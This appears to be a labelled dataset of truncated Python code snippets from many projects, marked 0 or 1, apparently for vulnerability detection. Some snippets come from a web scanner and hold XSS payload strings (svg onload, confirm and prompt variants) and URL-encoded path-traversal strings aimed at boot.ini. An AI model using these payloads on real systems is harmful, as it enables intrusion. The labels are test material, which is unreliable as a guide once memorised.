fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus", "label": 0}, {"snippet_id": 385, "code": " vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact", "label": 1}, {"snippet_id": 22058, "code": ".MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops'", "label": 0}, {"snippet_id": 12227, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index", "label": 1}, {"snippet_id": 45706, "code": "), mimetype=\"application/json\") @check_document_access_permission() def submit_bundle(request, doc_id): bundle=Bundle(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm", "label": 0}, {"snippet_id": 10436, "code": "\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp", "label": 0}, {"snippet_id": 26038, "code": "') self.request=kwargs.pop('request', None) self.validate_vat_id=kwargs.pop('validate_vat_id') self.all_optional=kwargs.pop('all_optional', False) super().__init__(*args, **kwargs) if not event.settings", "label": 0}, {"snippet_id": 36165, "code": "(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname", "label": 0}, {"snippet_id": 38060, "code": "\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list", "label": 0}, {"snippet_id": 6998, "code": ".views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$", "label": 0}, {"snippet_id": 33107, "code": " components import prpc import webapp2 from legacy import api as legacy_api from legacy import swarmbucket_api import access import api import bq import bulkproc import config import expiration import model", "label": 0}, {"snippet_id": 20209, "code": "-settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data", "label": 0}, {"snippet_id": 1691, "code": "'], 'Description': data['Description'], 'remediation': data['remediation']} vul_list.append(all_data) if data['id']: for vul in alerts: if data['id']==vul['id']: all_data={ 'url': data['url'], 'impact'", "label": 0}, {"snippet_id": 32955, "code": ") self._WriteTemplate('footer.html') def _DoImage(self, full_path, mime_type): self._WriteHeader(mime_type) with open(full_path) as f: self.wfile.write(f.read()) f.close() def _Read(self, relpath, relative_to", "label": 0}, {"snippet_id": 53637, "code": "(request.user, workflow, request.fs, request.jt, properties).deploy() deployment_mapping['wf_%s_dir' % i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord) coord_dir=Submission(request", "label": 0}, {"snippet_id": 25591, "code": " item=pos.item questions=pos.item.questions_to_ask event=kwargs.pop('event') super().__init__(*args, **kwargs) if item.admission and event.settings.attendee_names_asked: self.fields['attendee_name_parts'", "label": 0}, {"snippet_id": 30735, "code": "%(haproxy_sock, server_state_file) \t\tcommand=[ cmd, save_command] \telse: \t\tcommand=[ cmd] \t\t \tif enable !=\"show\": \t\tprint('<center><h3>You %s %s on HAproxy %s. <a href=\"viewsttats.py?serv=%s\" title=\"View", "label": 0}, {"snippet_id": 43138, "code": "=='Date' or df.fieldtype=='Datetime': \t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0", "label": 0}, {"snippet_id": 36167, "code": " self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn", "label": 0}, {"snippet_id": 16623, "code": ", name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$'", "label": 0}, {"snippet_id": 7871, "code": "/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$", "label": 0}, {"snippet_id": 24448, "code": " self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes", "label": 0}, {"snippet_id": 1531, "code": ": name=content['appname'] url=content['url'] headers=content['headers'] body=content['body'] method=content['method'] api=\"Y\" scan_status=scan_single_api(url, method, headers, body, api, scanid) if scan_status", "label": 0}, {"snippet_id": 2566, "code": ": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=", "label": 0}, {"snippet_id": 29048, "code": "+ \t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port+\" STAT_PORT=\"+stats_port+\" STAT_FILE=\"+server_state_file+ \t\t\t\t\" STATS_USER=\"+stats_user+\" STATS_PASS=\"+stats_password] \t \terror=str(upload(serv, tmp_config_path, script", "label": 0}, {"snippet_id": 32237, "code": " main(argv): parser=argparse.ArgumentParser(prog='md_browser') parser.add_argument('-p', '--port', type=int, default=8080, help='port to run on(default=%(default)s)') parser.add_argument('-d', '--directory", "label": 0}, {"snippet_id": 17908, "code": "'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', ", "label": 0}, {"snippet_id": 18228, "code": "\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*", "label": 1}, {"snippet_id": 35922, "code": " not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t", "label": 0}, {"snippet_id": 27309, "code": " import standard_library standard_library.install_aliases() import base64 import cgi import datetime import json import logging import os import re import sys import traceback import urllib.parse import", "label": 0}, {"snippet_id": 45862, "code": ".jt, properties).deploy() deployment_mapping['coord_%s_dir' % i]=coord_dir deployment_mapping['coord_%s' % i]=coord properties.update(deployment_mapping) submission=Submission(request.user, bundle, request", "label": 0}, {"snippet_id": 54381, "code": "(row=5, column=1) payload.config(width=30) proxy.grid(row=6, column=1) proxy.current(0) proxy.config(width=30) refresh.grid(row=7, column=1) refresh.current(1) refresh.config(width=30) crawl.grid(row=8", "label": 0}, {"snippet_id": 15548, "code": "={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not", "label": 0}, {"snippet_id": 42145, "code": " not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname", "label": 0}, {"snippet_id": 24003, "code": " settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout", "label": 0}, {"snippet_id": 49337, "code": "\"Cannot use a function that alters data in smart list\") except AttributeError: self.order_field=self.field_name pass if self.order_field: self.order=SmartOrder(query_params=query_params, column_id=column_id", "label": 0}, {"snippet_id": 18260, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page", "label": 1}, {"snippet_id": 44912, "code": " try: workflow_json=json.loads(request.POST.get('workflow', '{}')) workflow=Workflow(workflow=workflow_json) response['status']=0 response['xml']=workflow.to_xml() except Exception, e: response['message'", "label": 0}, {"snippet_id": 48355, "code": "(request.GET[\"srid\"])) ar.amount=quantity ar.notes=notes ar.save() else: if \"group_id\" not in request.GET: return HttpResponseRedirect(\"/admin?error=missing%20group%20id\") g: ArticleGroup=ArticleGroup.objects", "label": 0}, {"snippet_id": 15051, "code": "=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self", "label": 0}, {"snippet_id": 8859, "code": "), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 21232, "code": "<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P", "label": 1}, {"snippet_id": 10052, "code": " \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR", "label": 0}, {"snippet_id": 11379, "code": "\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}", "label": 0}, {"snippet_id": 55019, "code": ", ) for t in( Translation.objects .filter(pk__in=changed_translation_pks) .prefetch_related('entity__resource') ) ] TranslationMemoryEntry.objects.bulk_create(memory_entries) @login_required(redirect_field_name", "label": 0}, {"snippet_id": 51549, "code": " ], 'APP_DIRS': True, 'OPTIONS':{ 'context_processors':[ 'constance.context_processors.config', 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib", "label": 0}, {"snippet_id": 38604, "code": ".update(d) \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype)", "label": 0}, {"snippet_id": 53348, "code": "('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle() coordinators=[dict([('uuid', d.content_object.uuid),('name', d.content_object", "label": 0}, {"snippet_id": 39712, "code": ".get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t", "label": 0}, {"snippet_id": 8569, "code": "\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout')", "label": 0}, {"snippet_id": 37571, "code": " route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by", "label": 0}, {"snippet_id": 30751, "code": "<center><h3>You %s %s on HAproxy %s. <a href=\"viewsttats.py?serv=%s\" title=\"View stat\" target=\"_blank\">Look it</a> or <a href=\"edit.py\" title=\"Edit\">Edit something else</a></h3><br />' %(enable, backend", "label": 0}, {"snippet_id": 4953, "code": "/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn", "label": 0}, {"snippet_id": 21729, "code": "<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax',", "label": 0}, {"snippet_id": 46656, "code": "): form=self.get_form() if form.is_valid(): return self.form_valid(form) else: return self.render_to_response(self.get_context_data()) def get_form_kwargs(self, *args, **kwargs): kwargs=super().get_form_kwargs", "label": 0}, {"snippet_id": 13535, "code": "<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),", "label": 0}, {"snippet_id": 10110, "code": " suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/", "label": 0}, {"snippet_id": 3318, "code": " temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable", "label": 0}, {"snippet_id": 3067, "code": "'Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type']", "label": 0}, {"snippet_id": 27603, "code": " template_values={ 'message': message, 'user_email': helpers.get_user_email(), 'login_url': login_url, 'switch_account_url': login_url, 'logout_url': make_logout_url(dest_url=self.request.url), 'contact_string'", "label": 0}, {"snippet_id": 38356, "code": "\t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else", "label": 0}, {"snippet_id": 25522, "code": ": raise forms.ValidationError(self.error_messages['incomplete'], code='required') return value class BaseQuestionsForm(forms.Form): \"\"\" This form class is responsible for asking order-related questions", "label": 0}, {"snippet_id": 28921, "code": "'haproxy_config_path')\t \tssh=ssh_connect(serv) \ttry: \t\tsftp=ssh.open_sftp() \t\tsftp.get(config_path, cfg) \t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\tssh=str(e) \t\treturn ssh \t def diff_config", "label": 0}, {"snippet_id": 36014, "code": " \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname", "label": 0}, {"snippet_id": 1244, "code": ": db.scanids.insert({\"scanid\": scanid, \"name\": name, \"url\": url}) except: print \"Failed to update DB\" else: msg={\"status\": \"Failed\"} except: msg={\"status\": \"Failed\"} return jsonify(msg) @app.route('/scan", "label": 0}, {"snippet_id": 29692, "code": "**kwargs): \timport json \timport sql \thaproxy_sock_port=sql.get_setting('haproxy_sock_port') \tcmd='echo \"show backend\" |nc %s %s' %(serv, haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tret=", "label": 0}, {"snippet_id": 55152, "code": "])) if action_status['count']==0: return JsonResponse({ 'count': 0, 'invalid_translation_count': invalid_translation_count, }) update_stats(action_status['translated_resources'], locale) mark_changed_translation", "label": 0}, {"snippet_id": 43455, "code": "\t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get", "label": 0}, {"snippet_id": 48427, "code": " ar.SRID=SubReservation.objects.get(id=int(request.GET[\"srid\"])) ar.notes=str(request.POST[str(\"notes_\" +str(art.id))]) ar.save() if \"srid\" in request.GET: response=HttpResponseRedirect(forward_url +\"?rid", "label": 1}, {"snippet_id": 3398, "code": "+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload", "label": 0}, {"snippet_id": 24906, "code": ".verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite):", "label": 0}, {"snippet_id": 14529, "code": " paver commands themselves. Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import", "label": 0}, {"snippet_id": 36048, "code": "\t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):", "label": 0}, {"snippet_id": 10480, "code": " expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" '", "label": 0}, {"snippet_id": 18946, "code": ".test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/", "label": 0}, {"snippet_id": 2289, "code": ", payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact", "label": 0}, {"snippet_id": 53669, "code": "=coord_dir deployment_mapping['coord_%s' % i]=coord properties.update(deployment_mapping) submission=Submission(request.user, bundle, request.fs, request.jt, properties=properties) job_id=submission.run", "label": 0}, {"snippet_id": 21174, "code": "=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course", "label": 0}, {"snippet_id": 33530, "code": "/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro", "label": 0}, {"snippet_id": 22435, "code": ") urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view", "label": 0}, {"snippet_id": 28118, "code": "=env.get_template('config.html') print('Content-type: text/html\\n') funct.check_login() form=cgi.FieldStorage() serv=form.getvalue('serv') config_read=\"\" cfg=\"\" stderr=\"\" error=\"\" aftersave=\"\" try: \tcookie", "label": 0}, {"snippet_id": 30931, "code": " \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t read import config file</div>') \t\t \tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates", "label": 1}, {"snippet_id": 715, "code": " in xss_payloads: if result is not True: print \"param to test\",key parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value", "label": 1}, {"snippet_id": 10264, "code": " test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver", "label": 0}, {"snippet_id": 54000, "code": "'cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n') \t\tprint(colored('\\n\\n[+] ','green')+'New Cookie..\\n\\n') \t\treturn", "label": 0}, {"snippet_id": 237, "code": " headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging.info(\"XSS: No GET param found!\") def xss_check(url", "label": 0}, {"snippet_id": 27388, "code": ".datetime): return int((obj -self._EPOCH).total_seconds()) elif hasattr(obj, 'to_dict'): return obj.to_dict() elif isinstance(obj, cgi.FieldStorage): return str(obj) else: raise Exception('Cannot serialise", "label": 0}, {"snippet_id": 20874, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id'", "label": 0}, {"snippet_id": 30221, "code": ".getvalue('action'): \timport requests \tfrom requests_toolbelt.utils import dump \t \thaproxy_user=sql.get_setting('stats_user') \thaproxy_pass=sql.get_setting('stats_password') \tstats_port=sql.get_setting", "label": 0}, {"snippet_id": 19221, "code": " def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec", "label": 0}, {"snippet_id": 47689, "code": "(name='confirm_password', required=False)) f.add_content(PlainText(get_csrf_form_element(http_request))) f.add_content(SubmitButton()) a='<div class=\"w3-row w3-padding-64 w3-twothird w3-container admin", "label": 0}, {"snippet_id": 35795, "code": "}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit", "label": 0}, {"snippet_id": 43560, "code": " fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance(parentfield", "label": 0}, {"snippet_id": 19460, "code": "/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 8453, "code": ".contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE", "label": 0}, {"snippet_id": 13049, "code": "\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard", "label": 0}, {"snippet_id": 28571, "code": " Please check log_path in config %e</div></center>' % e) \t\tpass \t def telegram_send_mess(mess, **kwargs): \timport telebot \tfrom telebot import apihelper \timport sql \t \ttelegrams=sql.get_telegram_by_ip(kwargs", "label": 0}, {"snippet_id": 41346, "code": "\treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif", "label": 0}, {"snippet_id": 43116, "code": "\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df", "label": 0}, {"snippet_id": 18335, "code": "'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book", "label": 1}, {"snippet_id": 33435, "code": "\\%3E)|>)\") \t\t\tif any(x in _payload for x in \"\\\"'><;/\"): \t\t\t\treturn _payload \tdef check(self, url, payload, response, parameter): \t\tfor injection_types in self.signatures.keys(): \t\t\tfor sig in self.signatures", "label": 1}, {"snippet_id": 18970, "code": "/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload", "label": 0}, {"snippet_id": 16132, "code": "'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$", "label": 0}, {"snippet_id": 6060, "code": ", 'cert_chain': None, 'userdb_mongo_uri': None, 'userdb_mongo_database': None, 'sso_session_lifetime': '15', 'sso_session_mongo_uri': None, 'raven_dsn': None, 'content_packages':[], 'verify_request_signatures", "label": 0}, {"snippet_id": 11576, "code": "'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$'", "label": 0}, {"snippet_id": 26686, "code": "%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f", "label": 0}, {"snippet_id": 30331, "code": ") \texcept requests.exceptions.ConnectTimeout: \t\tprint('Oops. Connection timeout occured!') \texcept requests.exceptions.ReadTimeout: \t\tprint('Oops. Read timeout occured') \texcept requests.exceptions.HTTPError", "label": 0}, {"snippet_id": 30536, "code": "'minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \tapache_log_path=sql.get_setting('apache_log_path') \t \tif grep is not None: \t\tgrep_act ", "label": 0}, {"snippet_id": 32633, "code": "._DoRawSourceFile(full_path) else: self._DoUnknown() def _DoMD(self, path): extensions=[ 'markdown.extensions.def_list', 'markdown.extensions.fenced_code', 'markdown.extensions.tables', 'markdown.extensions", "label": 0}, {"snippet_id": 6555, "code": " @property def content_packages(self): \"\"\" Get list of tuples with packages and paths to content resources, such as login.html. The expected format in the INI file is content_packages=pkg1:some/path/, pkg2:foo ", "label": 0}, {"snippet_id": 12711, "code": " settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url", "label": 0}, {"snippet_id": 49594, "code": "=list_search or[] self.search_query_value=self.query_params.get(search_query_param, '') self.search_query_param=search_query_param self.ordering_query_value=self.query_params.get(ordering_query_param, '')", "label": 0}, {"snippet_id": 30777, "code": " \t\t\t \tfunct.ssh_command(serv, command, show_log=\"1\") \taction='edit.py ' +enable +' ' +backend \tfunct.logging(serv, action) if act==\"showCompareConfigs\": \timport glob \tfrom jinja2 import Environment, FileSystemLoader", "label": 0}, {"snippet_id": 8486, "code": ", url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user", "label": 0}, {"snippet_id": 5668, "code": "', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>'", "label": 0}, {"snippet_id": 43153, "code": ") !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install:", "label": 0}, {"snippet_id": 51724, "code": "'label': _('Dashboard'), 'items':[ {'name': 'internet_nl_dashboard.account'}, {'name': 'internet_nl_dashboard.urllist'}, {'name': 'internet_nl_dashboard.uploadlog'}, ]}, {'label': _('\ud83d\udd52 Periodic Tasks')", "label": 1}, {"snippet_id": 40489, "code": "\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field", "label": 0}, {"snippet_id": 2827, "code": "(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url", "label": 0}, {"snippet_id": 37333, "code": "\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t", "label": 0}, {"snippet_id": 37707, "code": "\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' 